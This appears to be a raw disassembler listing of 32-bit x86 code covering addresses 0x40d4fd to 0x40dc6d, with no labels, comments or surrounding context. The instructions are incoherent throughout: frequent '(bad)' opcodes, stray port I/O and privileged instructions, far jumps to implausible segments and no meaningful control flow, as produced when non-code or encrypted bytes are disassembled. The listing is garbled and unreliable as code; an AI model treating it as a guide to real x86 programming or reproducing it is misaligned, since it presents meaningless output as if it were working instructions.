  40d4fd:	or     eax,0x11386ed7
  40d502:	sbb    eax,0x8f5f78d1
  40d507:	shl    DWORD PTR [edx],0x2a
  40d50a:	loopne 0x40d523
  40d50c:	or     esp,esp
  40d50e:	add    al,0x1c
  40d510:	outs   dx,DWORD PTR ds:[esi]
  40d511:	xchg   esi,eax
  40d512:	aam    0x66
  40d514:	loop   0x40d55b
  40d516:	in     al,dx
  40d517:	xchg   ebx,eax
  40d518:	idiv   BYTE PTR [esi+ecx*8+0x39]
  40d51c:	in     eax,dx
  40d51d:	cdq    
  40d51e:	xor    cl,bl
  40d520:	(bad)  
  40d521:	rcr    DWORD PTR [esi-0x4e],1
  40d524:	xor    DWORD PTR [edx+0x1e],0xffffffe8
  40d528:	inc    edx
  40d529:	pop    es
  40d52a:	outs   dx,BYTE PTR ds:[esi]
  40d52b:	xchg   edx,eax
  40d52c:	dec    esi
  40d52d:	cli    
  40d52e:	push   ss
  40d52f:	pop    ebx
  40d530:	and    BYTE PTR es:[esi+0x1bd8af0a],0x16
  40d538:	fidivr DWORD PTR [edi+0x1b2c6b2c]
  40d53e:	mov    eax,ds:0x5becb0a5
  40d543:	outs   dx,DWORD PTR ds:[esi]
  40d544:	xor    ecx,DWORD PTR [eax+0x57b25b77]
  40d54a:	push   edi
  40d54b:	clc    
  40d54c:	jmp    0x5dbabce3
  40d551:	pop    ebp
  40d552:	ret    0xb59
  40d555:	jl     0x40d4ee
  40d557:	aas    
  40d558:	mov    DWORD PTR [edx+0x72f5085a],ebx
  40d55e:	jmp    0x3df5:0x9b4d1dcb
  40d565:	icebp  
  40d566:	xchg   edx,eax
  40d567:	pop    edi
  40d568:	adc    ah,BYTE PTR [edi-0x3f1369cd]
  40d56e:	lods   eax,DWORD PTR ds:[esi]
  40d56f:	inc    ecx
  40d570:	out    0xff,al
  40d572:	xchg   ebp,eax
  40d573:	inc    edx
  40d574:	and    dh,ch
  40d576:	sub    ebp,DWORD PTR [eax+eiz*2]
  40d579:	sub    al,BYTE PTR [eax+0x16]
  40d57c:	es nop
  40d57e:	rcr    BYTE PTR [ebx+eax*8-0x74],1
  40d582:	loopne 0x40d57e
  40d584:	sub    edx,DWORD PTR [esi+eiz*8-0x2b1c50cf]
  40d58b:	popf   
  40d58c:	(bad)  
  40d58d:	cmp    edx,ecx
  40d58f:	adc    ecx,DWORD PTR [edi-0x25e46d00]
  40d595:	add    al,0x76
  40d597:	lods   eax,DWORD PTR ds:[esi]
  40d598:	(bad)  
  40d599:	jl     0x40d5b3
  40d59b:	push   edx
  40d59c:	xchg   esp,eax
  40d59d:	or     eax,0x17be0780
  40d5a2:	push   0xffffffec
  40d5a4:	mov    ds:0x50b2eb2e,eax
  40d5a9:	out    dx,al
  40d5aa:	inc    eax
  40d5ab:	mov    DWORD PTR [edx+edi*8-0x43],edi
  40d5af:	scas   al,BYTE PTR es:[edi]
  40d5b0:	dec    edi
  40d5b1:	fwait
  40d5b2:	and    al,0x19
  40d5b4:	xchg   esp,eax
  40d5b5:	add    ebp,0xffffffe7
  40d5b8:	inc    esi
  40d5b9:	scas   al,BYTE PTR es:[edi]
  40d5ba:	gs daa 
  40d5bc:	mov    dl,0xbb
  40d5be:	rcl    BYTE PTR [eax+ebx*4-0x4e7ff9db],1
  40d5c5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d5c6:	adc    BYTE PTR [eax+0xc],bl
  40d5c9:	fs ins DWORD PTR es:[edi],dx
  40d5cb:	push   ss
  40d5cc:	in     al,0xd5
  40d5ce:	inc    edi
  40d5cf:	into   
  40d5d0:	pop    es
  40d5d1:	lahf   
  40d5d2:	imul   ecx,DWORD PTR [ecx],0x44
  40d5d5:	pop    ebp
  40d5d6:	(bad)  
  40d5d7:	(bad)  
  40d5d8:	pop    esi
  40d5d9:	mov    bl,0x50
  40d5db:	push   ss
  40d5dc:	mov    bh,0x22
  40d5de:	enter  0x3b,0x52
  40d5e2:	ret    0x8b34
  40d5e5:	shl    DWORD PTR [eax+0x3c],cl
  40d5e8:	adc    al,0xa8
  40d5ea:	sub    ch,BYTE PTR [esi-0x57]
  40d5ed:	daa    
  40d5ee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d5ef:	and    al,0xe4
  40d5f1:	std    
  40d5f2:	shl    DWORD PTR [eax-0x1c4f34aa],0x34
  40d5f9:	and    al,0x5a
  40d5fb:	xchg   DWORD PTR fs:[ebp-0x32],ebx
  40d5ff:	stc    
  40d600:	out    dx,eax
  40d601:	mov    ds:0x93221946,al
  40d606:	sti    
  40d607:	push   0xb662194c
  40d60c:	jp     0x40d5c0
  40d60e:	sbb    eax,ebp
  40d610:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d611:	lods   al,BYTE PTR ds:[esi]
  40d612:	cli    
  40d613:	inc    ebx
  40d614:	bound  eax,QWORD PTR [edx*8+0x842d2cf]
  40d61b:	cld    
  40d61c:	std    
  40d61d:	jo     0x40d5dd
  40d61f:	sti    
  40d620:	leave  
  40d621:	jae    0x40d6a2
  40d623:	sbb    BYTE PTR [ebx],dh
  40d625:	mov    edi,0x2453ef7d
  40d62a:	jns    0x40d5cc
  40d62c:	adc    ebx,DWORD PTR [ebx]
  40d62e:	or     eax,0xc55ead96
  40d633:	xchg   ecx,eax
  40d634:	or     edx,DWORD PTR [esi+0x1f46ad56]
  40d63a:	or     eax,0x77be8a21
  40d63f:	fld    QWORD PTR [edx]
  40d641:	fsubr  DWORD PTR [esi-0xfbbafe1]
  40d647:	cmp    dh,BYTE PTR [ebx+0x19]
  40d64a:	popf   
  40d64b:	adc    DWORD PTR [ecx+edi*2+0x63],esi
  40d64f:	pop    ds
  40d650:	push   esp
  40d651:	jmp    0xdf:0xaca1893a
  40d658:	int3   
  40d659:	sbb    cl,bh
  40d65b:	jns    0x40d62c
  40d65d:	bound  edx,QWORD PTR [ebx]
  40d65f:	outs   dx,BYTE PTR gs:[esi]
  40d661:	cwde   
  40d662:	jmp    0x40d649
  40d664:	ret    0x7c8d
  40d667:	sbb    bh,BYTE PTR [ebp-0x6b9480ec]
  40d66d:	pop    ds
  40d66e:	pushf  
  40d66f:	das    
  40d670:	push   esi
  40d671:	xchg   esp,eax
  40d672:	in     eax,dx
  40d673:	daa    
  40d674:	cwde   
  40d675:	nop
  40d676:	pop    ds
  40d677:	loop   0x40d639
  40d679:	or     eax,0xc633abe6
  40d67e:	(bad)  
  40d680:	and    edx,DWORD PTR [eax]
  40d682:	aaa    
  40d683:	add    al,0x12
  40d685:	adc    bh,BYTE PTR [edi+0x7f9540f3]
  40d68b:	adc    al,0x13
  40d68d:	mov    WORD PTR [ecx+0x2622fb43],ds
  40d693:	mov    edx,DWORD PTR ds:0x326bf95f
  40d699:	outs   dx,BYTE PTR ds:[esi]
  40d69a:	or     al,dh
  40d69c:	sbb    esp,0xa179be4a
  40d6a2:	pop    ss
  40d6a3:	loope  0x40d680
  40d6a5:	xlat   BYTE PTR ds:[ebx]
  40d6a6:	test   BYTE PTR [ecx-0x44f2ce8c],bh
  40d6ac:	push   ebp
  40d6ad:	scas   al,BYTE PTR es:[edi]
  40d6ae:	sbb    bh,cl
  40d6b0:	adc    DWORD PTR [edx],ebp
  40d6b2:	(bad)  
  40d6b3:	fidivr WORD PTR [edi-0x65]
  40d6b6:	adc    al,0xb6
  40d6b8:	push   esp
  40d6b9:	mov    DWORD PTR [eax+0x35344921],ebp
  40d6bf:	pop    ss
  40d6c0:	addr16 xor eax,0xc2e2d68f
  40d6c6:	jo     0x40d6f6
  40d6c8:	dec    esp
  40d6c9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d6ca:	ror    BYTE PTR [esi+0x45],0xae
  40d6ce:	scas   al,BYTE PTR es:[edi]
  40d6cf:	add    eax,0xfb37a4e0
  40d6d4:	dec    edi
  40d6d5:	jns    0x40d673
  40d6d7:	repz cmp DWORD PTR [ebp+edi*2-0x2e],edi
  40d6dc:	test   edx,0x7389a4e3
  40d6e2:	pop    edi
  40d6e3:	dec    esi
  40d6e4:	cmp    BYTE PTR [ebx+eiz*2-0xfb9ed07],bh
  40d6eb:	mov    esi,DWORD PTR [edx+0x6d29c674]
  40d6f1:	jne    0x40d6cb
  40d6f3:	fcmovnb st,st(2)
  40d6f5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d6f6:	nop
  40d6f7:	fwait
  40d6f8:	inc    ecx
  40d6f9:	cmc    
  40d6fa:	or     ah,bh
  40d6fc:	jle    0x40d6a4
  40d6fe:	sbb    DWORD PTR [eax],esp
  40d700:	inc    esp
  40d701:	mov    cl,0x88
  40d703:	xor    al,0xc4
  40d705:	or     eax,0xc8952bed
  40d70a:	adc    cl,BYTE PTR [edx-0x7c]
  40d70d:	mov    ds:0x5559bab8,eax
  40d712:	leave  
  40d713:	mov    cl,0xca
  40d715:	das    
  40d716:	out    dx,eax
  40d717:	lods   eax,DWORD PTR ds:[esi]
  40d718:	sub    eax,0x3f9999d2
  40d71d:	dec    ecx
  40d71e:	inc    eax
  40d71f:	repnz and BYTE PTR [esi+0x2f],bl
  40d723:	xchg   ebx,eax
  40d724:	in     eax,dx
  40d725:	mov    ebx,0x7e090c41
  40d72a:	mov    ebx,0xfc760ed0
  40d72f:	mov    dh,0x8f
  40d731:	mov    ecx,0xf403a31b
  40d736:	mov    dl,0x7f
  40d738:	jmp    0x40d6d8
  40d73a:	and    al,0xa8
  40d73c:	imul   esi,ebp,0xde04d96d
  40d742:	loop   0x40d6f8
  40d744:	dec    esp
  40d745:	stos   DWORD PTR es:[edi],eax
  40d746:	add    eax,0xeae058ca
  40d74b:	sub    ebp,0x898547c7
  40d751:	ja     0x40d7a9
  40d753:	retf   
  40d754:	jb     0x40d77e
  40d756:	push   edx
  40d757:	push   0x4b
  40d759:	cld    
  40d75a:	pop    ss
  40d75b:	adc    eax,0x684779e4
  40d760:	sub    bh,cl
  40d762:	mov    BYTE PTR [eax+0x76bc2ebe],ch
  40d768:	push   0xffffffe8
  40d76a:	adc    BYTE PTR [eax],cl
  40d76c:	dec    ebp
  40d76d:	and    bh,ch
  40d76f:	retf   0xe570
  40d772:	adc    DWORD PTR [ebp-0x3ce3944d],edi
  40d778:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d779:	sar    bh,1
  40d77b:	ds cwde 
  40d77d:	push   eax
  40d77e:	addr16 in eax,dx
  40d780:	shl    BYTE PTR [edx],0xc
  40d783:	fwait
  40d784:	hlt    
  40d785:	ficomp DWORD PTR ds:0xe27a8f0b
  40d78b:	xchg   DWORD PTR [esi+0x27fbaeb7],esp
  40d791:	lds    esi,FWORD PTR [edx]
  40d793:	mov    cl,0xdf
  40d795:	sbb    eax,0x66f853f1
  40d79a:	mov    al,0xa6
  40d79c:	mov    ecx,0xef343c97
  40d7a1:	in     eax,0xe8
  40d7a3:	xchg   esi,eax
  40d7a4:	and    eax,0x9817383e
  40d7a9:	mov    ch,0x3d
  40d7ab:	xor    BYTE PTR [eiz*4-0x10d1f754],al
  40d7b2:	jecxz  0x40d76a
  40d7b4:	mov    al,0xf2
  40d7b6:	jmp    0x40d793
  40d7b8:	cdq    
  40d7b9:	mov    bl,BYTE PTR [edi]
  40d7bb:	pop    ecx
  40d7bc:	dec    esi
  40d7bd:	adc    ecx,DWORD PTR [esi]
  40d7bf:	jmp    0x40d7f2
  40d7c1:	inc    ebx
  40d7c2:	pop    edx
  40d7c3:	in     eax,dx
  40d7c4:	in     al,0x5
  40d7c6:	scas   al,BYTE PTR es:[edi]
  40d7c7:	dec    esp
  40d7c8:	(bad)  
  40d7c9:	loopne 0x40d770
  40d7cb:	and    DWORD PTR [esp+ebp*2+0x35],0x22
  40d7d0:	in     al,0xf2
  40d7d2:	mov    ds:0x7ef2c9ca,al
  40d7d7:	sub    DWORD PTR [eiz*2-0x2f5c1d57],esp
  40d7de:	rcr    DWORD PTR [eax-0x3d],0xcb
  40d7e2:	xor    BYTE PTR [eax+0x3f],bh
  40d7e5:	aaa    
  40d7e6:	xchg   esp,esi
  40d7e8:	loop   0x40d78b
  40d7ea:	retf   
  40d7eb:	xor    edi,DWORD PTR [edi-0x33]
  40d7ee:	fsubr  st,st(5)
  40d7f0:	sbb    eax,0xc7473d0a
  40d7f5:	rol    BYTE PTR [esi+0x3b2954ee],0x77
  40d7fc:	aaa    
  40d7fd:	mov    ch,0x7f
  40d7ff:	sub    ebp,ecx
  40d801:	lods   al,BYTE PTR ds:[esi]
  40d802:	mov    BYTE PTR [ebx-0x62bd8ac1],0x85
  40d809:	or     DWORD PTR ds:0x693e247f,edi
  40d80f:	fsubr  DWORD PTR [eax+0x13dfcb1e]
  40d815:	ret    0xb75d
  40d818:	and    ecx,DWORD PTR [esp+ebp*4]
  40d81b:	mov    al,0x1b
  40d81d:	xor    edx,DWORD PTR [edx-0x23289fc6]
  40d823:	lods   eax,DWORD PTR ds:[esi]
  40d824:	(bad)  
  40d825:	fnsetpm(287 only) 
  40d827:	and    eax,0xe862792b
  40d82c:	mov    ebp,0x37687a8d
  40d831:	mov    esp,0x3363d708
  40d836:	icebp  
  40d837:	mov    bl,0x73
  40d839:	mov    ds:0x5558b280,al
  40d83e:	mov    ds:0x8063ca7d,al
  40d843:	(bad)  
  40d844:	mov    edi,0x42755b5a
  40d849:	div    BYTE PTR ds:0xe7266904
  40d84f:	xchg   esi,eax
  40d850:	xchg   BYTE PTR [ebx+0x55d14652],bl
  40d856:	stc    
  40d857:	xor    eax,0xc3fc7116
  40d85c:	imul   ebx,DWORD PTR [esi-0x31e2e902],0x5b2aa2ff
  40d866:	pop    eax
  40d867:	sbb    dh,dh
  40d869:	mov    dl,0xd
  40d86b:	(bad)  
  40d86c:	dec    esi
  40d86d:	bound  ebx,QWORD PTR [ebx]
  40d86f:	shr    ecx,cl
  40d871:	repnz retf 0xfcf8
  40d875:	dec    esp
  40d876:	hlt    
  40d877:	outs   dx,BYTE PTR ds:[esi]
  40d878:	xlat   BYTE PTR ds:[ebx]
  40d879:	ins    BYTE PTR es:[edi],dx
  40d87a:	cmp    cl,0x26
  40d87d:	jl     0x40d8af
  40d87f:	ss or  al,0x10
  40d882:	pop    eax
  40d883:	dec    esi
  40d884:	aam    0x28
  40d886:	jp     0x40d8c9
  40d888:	loope  0x40d811
  40d88a:	jno    0x40d87d
  40d88c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d88d:	fadd   QWORD PTR [edi+0x39]
  40d890:	mov    ecx,0x81218e18
  40d895:	mov    edx,0xdbdc96d9
  40d89a:	xchg   ebx,eax
  40d89b:	or     al,0xae
  40d89d:	jo     0x40d8c1
  40d89f:	pop    ebp
  40d8a0:	and    esi,DWORD PTR [edx]
  40d8a2:	cld    
  40d8a3:	rsm    
  40d8a5:	jae    0x40d858
  40d8a7:	and    al,0x5f
  40d8a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d8aa:	sub    edx,DWORD PTR ds:0xcd39c942
  40d8b0:	lahf   
  40d8b1:	inc    ebx
  40d8b2:	test   eax,0x58dbb19c
  40d8b7:	xchg   edx,eax
  40d8b8:	loopne 0x40d910
  40d8ba:	mov    ch,BYTE PTR [ecx-0x35]
  40d8bd:	jbe    0x40d924
  40d8bf:	xchg   ebx,eax
  40d8c0:	ja     0x40d90e
  40d8c2:	popa   
  40d8c3:	test   al,0xb3
  40d8c5:	sub    eax,DWORD PTR [ecx+0x7aae80e3]
  40d8cb:	add    ebp,0x43ee72e
  40d8d1:	stos   DWORD PTR es:[edi],eax
  40d8d2:	in     eax,dx
  40d8d3:	push   ebx
  40d8d4:	in     al,dx
  40d8d5:	jmp    0x40d899
  40d8d7:	je     0x40d8c6
  40d8d9:	test   DWORD PTR [ebp+0xe232b14],ebx
  40d8df:	ret    0x7f56
  40d8e2:	sub    BYTE PTR [edx+0x199e9765],ch
  40d8e8:	shl    al,0x1e
  40d8eb:	ins    DWORD PTR es:[edi],dx
  40d8ec:	(bad)  [esi+0x12]
  40d8ef:	pop    edi
  40d8f0:	(bad)  
  40d8f1:	in     eax,dx
  40d8f2:	cmp    eax,0x9eae71c7
  40d8f7:	(bad)  
  40d8f8:	inc    esp
  40d8f9:	lods   al,BYTE PTR ds:[esi]
  40d8fa:	pop    ss
  40d8fb:	and    ebx,esp
  40d8fd:	clc    
  40d8fe:	call   0x656:0xf38594af
  40d905:	sti    
  40d906:	dec    eax
  40d907:	cwde   
  40d908:	add    DWORD PTR [esp+eax*4],ecx
  40d90b:	ficomp WORD PTR ds:0xfccd8985
  40d911:	inc    esp
  40d912:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d913:	and    BYTE PTR [ecx+ebp*2+0x6b],al
  40d917:	jb     0x40d91d
  40d919:	in     al,dx
  40d91a:	add    BYTE PTR [edx+0x44],dh
  40d91d:	sub    al,0x1
  40d91f:	jge    0x40d8fe
  40d921:	add    al,BYTE PTR [ecx+ebp*8+0x61209ca6]
  40d928:	mov    ah,0x4b
  40d92a:	add    ah,BYTE PTR [ebx+0x229f55c8]
  40d930:	xchg   edx,eax
  40d931:	add    BYTE PTR [edi+0x49],dl
  40d934:	gs (bad) 
  40d936:	in     eax,dx
  40d937:	nop
  40d938:	repz jg 0x40d8f0
  40d93b:	repz clc 
  40d93d:	nop
  40d93e:	mov    dl,0x4e
  40d940:	and    BYTE PTR [esi],al
  40d942:	into   
  40d943:	jge    0x40d944
  40d945:	pop    eax
  40d946:	xor    esp,edx
  40d948:	(bad)  
  40d949:	pop    esi
  40d94a:	test   DWORD PTR [ecx+ebp*8+0x74],esp
  40d94e:	cmp    BYTE PTR ds:0x8487fa90,0xcf
  40d955:	mov    dh,dh
  40d957:	(bad)  
  40d958:	xlat   BYTE PTR ds:[ebx]
  40d959:	aaa    
  40d95a:	xlat   BYTE PTR ds:[ebx]
  40d95b:	pop    ss
  40d95c:	inc    ebx
  40d95d:	stos   DWORD PTR es:[edi],eax
  40d95e:	dec    edx
  40d95f:	mov    fs,WORD PTR [ebp+0x2a]
  40d962:	loope  0x40d8e9
  40d964:	ds dec esp
  40d966:	arpl   bp,di
  40d968:	xchg   ebp,eax
  40d969:	jnp    0x40d965
  40d96b:	popf   
  40d96c:	and    dh,BYTE PTR [ecx+0x27]
  40d96f:	cmp    cl,BYTE PTR [ebx+0x2f67e8b4]
  40d975:	cmp    eax,0x1c5f2ef1
  40d97a:	loopne 0x40d94e
  40d97c:	sub    bh,cl
  40d97e:	dec    ebp
  40d97f:	loope  0x40d955
  40d981:	cmp    DWORD PTR [edi],0x1b
  40d984:	shr    BYTE PTR ds:0xd9158f4b,1
  40d98a:	test   DWORD PTR [ebx+0x7e01d0b],0x9fc9c554
  40d994:	lock xlat BYTE PTR ds:[ebx]
  40d996:	mov    esi,ds
  40d998:	mov    al,ds:0x3103133c
  40d99d:	sbb    al,0x9e
  40d99f:	jmp    0x8eb1022d
  40d9a4:	pop    ebp
  40d9a5:	sbb    dl,cl
  40d9a7:	pop    ss
  40d9a8:	sbb    eax,0xf5a85d98
  40d9ad:	xchg   ebp,eax
  40d9ae:	popa   
  40d9af:	mov    ch,0x2d
  40d9b1:	pushf  
  40d9b2:	mov    esi,0x7c572a74
  40d9b7:	lock xor al,0xe4
  40d9ba:	jae    0x40d967
  40d9bc:	jnp    0x40d941
  40d9be:	adc    al,0x67
  40d9c0:	jp     0x40da1a
  40d9c2:	add    eax,0x27942abe
  40d9c7:	(bad)
  40d9cb:	sub    bh,dh
  40d9cd:	jnp    0x40d9ed
  40d9cf:	dec    ebp
  40d9d0:	js     0x40d9ae
  40d9d2:	lods   eax,DWORD PTR ds:[esi]
  40d9d3:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  40d9d5:	test   BYTE PTR es:[eax+edx*4+0x3d],ch
  40d9da:	mov    fs,WORD PTR [edi-0x2734232a]
  40d9e0:	iret   
  40d9e1:	data16 fistp WORD PTR [eax+ebp*4]
  40d9e5:	enter  0xe566,0xa
  40d9e9:	jmp    0x84958617
  40d9ee:	enter  0xab9d,0x47
  40d9f2:	(bad)  
  40d9f3:	push   cs
  40d9f4:	add    al,0x6d
  40d9f6:	int    0xaf
  40d9f8:	gs out 0xf5,eax
  40d9fb:	pop    edi
  40d9fc:	shl    BYTE PTR [ebx+0x14],1
  40d9ff:	sbb    al,0xfc
  40da01:	and    edi,edi
  40da03:	pop    es
  40da04:	fiadd  WORD PTR [esp+eiz*2-0x53fb8102]
  40da0b:	mov    WORD PTR [esp+esi*8-0x3e6964d5],gs
  40da12:	xchg   esi,eax
  40da13:	or     al,dh
  40da15:	pop    esp
  40da16:	ficomp WORD PTR [edi+ecx*8+0x1442d6f1]
  40da1d:	inc    edi
  40da1e:	mov    bh,0xe6
  40da20:	mov    edx,0x8bdcf765
  40da25:	arpl   WORD PTR [esi+0x16],sp
  40da28:	push   eax
  40da29:	mov    ebx,edx
  40da2b:	je     0x40da05
  40da2d:	repz pop eax
  40da2f:	stos   DWORD PTR es:[edi],eax
  40da30:	mov    esp,DWORD PTR [ecx]
  40da32:	dec    ebx
  40da33:	in     eax,dx
  40da34:	outs   dx,BYTE PTR ds:[esi]
  40da35:	(bad)  
  40da37:	pop    eax
  40da38:	icebp  
  40da39:	push   ebx
  40da3a:	xchg   edi,eax
  40da3b:	and    cl,BYTE PTR [edi-0x1c]
  40da3e:	pop    edx
  40da3f:	and    al,0x32
  40da41:	mov    ds:0xd5759387,eax
  40da46:	push   ss
  40da47:	aaa    
  40da48:	jo     0x40daa3
  40da4a:	add    al,0xbf
  40da4c:	rol    DWORD PTR [ecx],0xe0
  40da4f:	inc    ebx
  40da50:	mov    ah,0xb0
  40da52:	inc    esi
  40da53:	mov    WORD PTR [ebx],cs
  40da55:	into   
  40da56:	popf   
  40da57:	out    dx,eax
  40da58:	mov    ecx,0x836fdc3
  40da5d:	sbb    BYTE PTR [ecx],0x69
  40da60:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40da61:	in     al,0xfa
  40da63:	js     0x40da0b
  40da65:	add    al,dl
  40da67:	fnstsw WORD PTR [ebp-0x626b7862]
  40da6d:	jl     0x40da64
  40da6f:	mov    bh,0xa3
  40da71:	pop    edx
  40da72:	nop
  40da73:	imul   ebx,DWORD PTR [edx+0x53],0x37
  40da77:	out    0x21,al
  40da79:	(bad)  
  40da7a:	or     dl,bl
  40da7c:	xchg   edi,eax
  40da7d:	jbe    0x40dac2
  40da7f:	imul   ebp,DWORD PTR [edi-0x29c676c1],0xffffffc7
  40da86:	mov    ds:0x4021850,eax
  40da8b:	je     0x40da49
  40da8d:	inc    ebx
  40da8e:	jge    0x40da11
  40da90:	inc    esi
  40da91:	adc    DWORD PTR fs:[edi+0x7f3e9d10],0x2b0bea5
  40da9c:	dec    esp
  40da9d:	push   0x5b
  40da9f:	ret    
  40daa0:	(bad)
  40daa3:	cmp    bh,BYTE PTR [edi+0x24]
  40daa6:	inc    ebx
  40daa7:	sahf   
  40daa8:	push   edx
  40daa9:	inc    ebp
  40daaa:	sbb    eax,0x1c946233
  40daaf:	xor    al,0xeb
  40dab1:	and    esp,esp
  40dab3:	push   0xecd01607
  40dab8:	mov    ah,0xbe
  40daba:	sbb    DWORD PTR [esi-0x43350bb2],esi
  40dac0:	push   ebp
  40dac1:	lods   eax,DWORD PTR ds:[esi]
  40dac2:	cmp    DWORD PTR ds:0x9f6bde1d,esi
  40dac8:	div    DWORD PTR [edi]
  40daca:	clc    
  40dacb:	dec    eax
  40dacc:	push   ebx
  40dacd:	jns    0x40db0c
  40dacf:	div    DWORD PTR ds:0x630bbd22
  40dad5:	stos   DWORD PTR es:[edi],eax
  40dad6:	sbb    al,dh
  40dad8:	leave  
  40dad9:	xor    ah,bl
  40dadb:	jp     0x40db44
  40dadd:	fld    DWORD PTR [edx-0xb89167]
  40dae3:	push   ss
  40dae4:	adc    edi,DWORD PTR [esi-0x685c5262]
  40daea:	push   ebx
  40daeb:	xchg   esi,eax
  40daec:	xchg   ecx,eax
  40daed:	ja     0x40db25
  40daef:	rcr    DWORD PTR [edi+0xa1aff28],cl
  40daf5:	test   bh,dh
  40daf7:	inc    DWORD PTR [edx-0x70]
  40dafa:	fiadd  DWORD PTR [eax]
  40dafc:	ret    
  40dafd:	push   0x98d46af4
  40db02:	xor    DWORD PTR ds:0x784318ab,ebp
  40db08:	popa   
  40db09:	mov    esp,0x1ba5e889
  40db0e:	es repnz inc edi
  40db11:	add    al,BYTE PTR [edx+0x24510e9b]
  40db17:	aad    0x4f
  40db19:	xor    DWORD PTR [edi+0x2ad26ad4],esi
  40db1f:	nop
  40db20:	push   ss
  40db21:	xchg   ebp,eax
  40db22:	jmp    0x40daf5
  40db24:	jno    0x40db30
  40db26:	xchg   esp,eax
  40db27:	add    ch,BYTE PTR [ebx+0x4442e72f]
  40db2d:	cmp    dh,BYTE PTR [ebx]
  40db2f:	lea    esi,[ebx-0x4f]
  40db32:	enter  0x6a13,0xbe
  40db36:	jae    0x40db8e
  40db38:	sbb    bh,BYTE PTR [ebx]
  40db3a:	in     eax,dx
  40db3b:	imul   ecx,DWORD PTR [ebp-0x5cb4335e],0x51
  40db42:	sbb    cl,bl
  40db44:	adc    BYTE PTR [ebx],bh
  40db46:	jmp    0x7cdfd149
  40db4b:	test   al,0x17
  40db4d:	jp     0x40dba8
  40db4f:	add    bh,ah
  40db51:	mov    ebx,0x6d2dadd6
  40db56:	arpl   WORD PTR [ebp+0x2b],si
  40db59:	sbb    al,0x94
  40db5b:	(bad)  
  40db5c:	mov    ds:0xf116f70,eax
  40db61:	xchg   ebx,eax
  40db62:	mov    esp,0xe17ae0e2
  40db67:	and    bh,BYTE PTR [esi+0x10]
  40db6a:	pop    esi
  40db6b:	mov    esi,0xbbc40e7b
  40db70:	adc    ah,BYTE PTR [ebx]
  40db72:	scas   al,BYTE PTR es:[edi]
  40db73:	xchg   esi,eax
  40db74:	dec    ebp
  40db75:	nop
  40db76:	mov    al,0x7c
  40db78:	loope  0x40dbab
  40db7a:	loop   0x40db2a
  40db7c:	pop    ecx
  40db7d:	ret    
  40db7e:	cld    
  40db7f:	arpl   WORD PTR [eax+0x4c],bx
  40db82:	mov    eax,ds:0x75b616c4
  40db87:	outs   dx,DWORD PTR ds:[esi]
  40db88:	jp     0x40dbd4
  40db8a:	mov    eax,0xa3e5cc8e
  40db8f:	pop    eax
  40db90:	ins    BYTE PTR es:[edi],dx
  40db91:	in     al,0x54
  40db93:	mov    al,fs:0x48aa361f
  40db99:	xor    al,0x7d
  40db9c:	push   ds
  40db9d:	cmp    DWORD PTR [eax+0x23201f1d],esp
  40dba3:	jae    0x40dbbc
  40dba5:	mov    WORD PTR [ecx-0x59],ss
  40dba8:	(bad)  
  40dba9:	xchg   ebp,eax
  40dbaa:	mov    ah,0xc1
  40dbac:	sub    eax,0x7212dff
  40dbb1:	xor    DWORD PTR [ebx+0x32],eax
  40dbb4:	inc    ebp
  40dbb5:	adc    eax,0xf0a4185e
  40dbba:	push   edi
  40dbbb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dbbc:	cmc    
  40dbbd:	mov    ds:0xc6789563,eax
  40dbc2:	mov    al,ds:0x1588c051
  40dbc7:	imul   ebx,eax,0x45
  40dbca:	mov    bh,ah
  40dbcc:	sar    ebp,0xed
  40dbcf:	cwde   
  40dbd0:	loopne 0x40dbf2
  40dbd2:	sub    ah,dh
  40dbd4:	inc    ebx
  40dbd5:	cmp    eax,0x93f36c1b
  40dbda:	gs aam 0x4c
  40dbdd:	ss or  edi,edx
  40dbe0:	loope  0x40db7f
  40dbe2:	sbb    BYTE PTR [ebx-0x2e],dh
  40dbe5:	push   ds
  40dbe6:	pop    esp
  40dbe7:	pop    esp
  40dbe8:	outs   dx,DWORD PTR ds:[esi]
  40dbe9:	xor    eax,0x2b0a6d6f
  40dbee:	fcomp  QWORD PTR ds:0x411bbf17
  40dbf4:	mov    ebx,DWORD PTR [ebx]
  40dbf6:	add    BYTE PTR [ebx-0x227993f3],bh
  40dbfc:	stc    
  40dbfd:	mov    ds:0xa43d3c33,eax
  40dc02:	xchg   esp,eax
  40dc03:	sahf   
  40dc04:	fstp   DWORD PTR [edx]
  40dc06:	outs   dx,DWORD PTR ds:[esi]
  40dc07:	out    0xce,eax
  40dc09:	out    dx,eax
  40dc0a:	xor    DWORD PTR [ebx+0x4e0333d],esi
  40dc10:	xchg   esp,eax
  40dc11:	mov    edi,0x3542c4b5
  40dc16:	test   BYTE PTR [ecx+esi*4-0x5b],dh
  40dc1a:	les    edi,FWORD PTR [ecx]
  40dc1c:	(bad)  
  40dc1e:	adc    esi,DWORD PTR [edx-0x5a]
  40dc21:	and    eax,0xacfda67a
  40dc26:	leave  
  40dc27:	inc    ecx
  40dc28:	shl    DWORD PTR [edx],cl
  40dc2a:	sbb    esp,DWORD PTR [ebx-0x6b62a07f]
  40dc30:	std    
  40dc31:	mov    esp,0x98902c42
  40dc36:	rol    DWORD PTR ds:0x76922fc8,0xc3
  40dc3d:	cmp    ch,BYTE PTR [ecx+0x4d]
  40dc40:	shl    DWORD PTR [edx+0x60198437],0x6a
  40dc47:	xor    BYTE PTR [ecx],0xb7
  40dc4a:	test   al,0x78
  40dc4c:	aam    0x5
  40dc4e:	loope  0x40dc98
  40dc50:	test   eax,0x2a7888eb
  40dc55:	fisubr DWORD PTR [ecx+0x3a821295]
  40dc5b:	push   ecx
  40dc5c:	or     bl,dl
  40dc5e:	enter  0xba82,0x30
  40dc62:	cmp    ecx,eax
  40dc64:	ficom  DWORD PTR [eax-0x3490abc6]
  40dc6a:	adc    ch,BYTE PTR [eax+0x3]
  40dc6d:	jb     0x40dc6b
